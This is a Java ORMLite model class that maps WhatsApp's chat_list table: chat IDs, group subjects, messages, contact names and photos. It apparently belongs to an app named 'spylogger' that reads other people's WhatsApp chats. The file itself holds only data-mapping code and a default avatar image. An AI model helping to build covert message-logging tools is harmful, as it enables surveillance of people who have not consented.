package com.gravatasufoca.spylogger.model.whatsapp;

import android.content.ContentResolver;

import com.gravatasufoca.spylogger.utils.Utils;
import com.j256.ormlite.dao.ForeignCollection;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.field.ForeignCollectionField;
import com.j256.ormlite.table.DatabaseTable;

import java.io.File;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

@DatabaseTable(tableName="chat_list")
public class ChatList extends EntidadeAbstrata{
	private static final long serialVersionUID = -4679985146526783051L;

	public ChatList() {
	}

	@Override
	public Serializable getId() {
		// TODO Auto-generated method stub
		return _id;
	}

	@DatabaseField()
	private Integer _id;

	@DatabaseField(id=true)
	private String key_remote_jid;

	@DatabaseField()
	private Integer message_table_id;

	@ForeignCollectionField(eager=false,orderAscending=false,orderColumnName="timestamp", foreignFieldName="chatList")
	private ForeignCollection<Messages> mensagens;

	@DatabaseField()
	private String subject;

	@DatabaseField(dataType=DataType.DATE_LONG)
	private Date creation;

	private String photo;

	public String getKey_remote_jid() {
		return key_remote_jid;
	}

	public void setKey_remote_jid(String key_remote_jid) {
		this.key_remote_jid = key_remote_jid;
	}

	public Integer getMessage_table_id() {
		return message_table_id;
	}

	public void setMessage_table_id(Integer message_table_id) {
		this.message_table_id = message_table_id;
	}

	public List<Messages> getMensagens() {
		return new ArrayList<Messages>(mensagens);
	}

	public void setMensagens(ForeignCollection<Messages> mensagens) {
		this.mensagens = mensagens;
	}

	public String getSubject() {
		return subject;
	}
	public void setSubject(String subject) {
		this.subject = subject;
	}
	public Date getCreation() {
		return creation;
	}
	public void setCreation(Date creation) {
		this.creation = creation;
	}

	public String getNome(ContentResolver contentResolver){
		if(getSubject()!=null && getSubject()!="")
			return getSubject();

		String nome = getKey_remote_jid();
		try {
			nome = Utils.getContactDisplayNameByNumber(getKey_remote_jid(),
					contentResolver);
		} catch (Exception e) {
		}
		return nome;
	}

	public String getPhoto(){
		if(photo==null){
			photo="iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAAA3NCSVQICAjb4U/gAAAASFBMVEX////k5OTe3t7V1dbMzMzFxca9vb29vcW1tbatra2lpaafn6GZmZmUlJWPj5GMjI2Hh4iEhIV+foB6enxzc3tycnRubnBqamz1rEYLAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAK8AAACvABQqw0mAAAAoVJREFUeNrt2tmSozAMBVBkGxqzJeA2/P+fTqamZqar0p1I4ip+iO87xSkvwgvNUThNBVRABVRABVSA9sFtGqbpsm15S68E/H7Zvo59oK8J8foiQPYUPH0XrzXIAB09iB93a8BEj+NiMgWsjp4mZjvAQJy4xQiQW2ImmgAujtgZDACRJBngANn7iSYwQPp+cgkKmEmcgARkJwfwhwED0CveTy7DABupEmGATgfgNsFTQCZlBhBg1gICCDBpAQ7VBb4wQFcGkIDDV4AO4Cvg7QHh7QHt2wM6GKDVAXoYIJquyRgA5aJwxO0LdH0w4wC6RdGKA1wN6xALkAyXA4ZdEFYUQLkzYe4MngPUGwNeLzR2DUCUIYCgB2wQQFsacKILEgQQS4+BqfQsWNWAgAHsakAPqoTqeTiCANFyFnIA2kHgYV9D5bI4wgCDbhImGGBvzYYg87R8D0ZzkH1fkMUC5saMf2Uj/CS1OxogW5g6/hUm+9ZM1AndgQeMJe+MxAemyQAgGYb8GyMJYMHflsgAB78PVhtAxH4G5YANXYWlAHYpWK0AI/gzIAYwy/HFDJANGkD2Ewu6DIsBrEqwlAZcDQEePgmFgADbjigBbWlA9/aAvjQggpdjNi1gCOCtSNpkBGD/TudGE8BVcEoQNjxAtC+5rYsTFvApPy4N4ycMMCuPi1mGp4AtKn9i+TMlxnwKkMcTh/V/DVPWApaOMPl4YPgRkE41/f2JwZwlgH1qCZ5u3pmAS+/IJt8Y7gBp8GQY1y37A8A+t2Sem+EHwGrW9HeG/l87NP+nvKeXpk9fAbApLz5Nbk5X2zNF8lYbGkS1Vceno6Gi8akwgEJpAFVABVRABRQH/AIdJV6rCRVksgAAAABJRU5ErkJggg==";

			File foto= Utils.getFotoContato(getKey_remote_jid());
			if(foto!=null)
				photo=Utils.encodeBase64(foto);

		}
		return photo;
	}
}
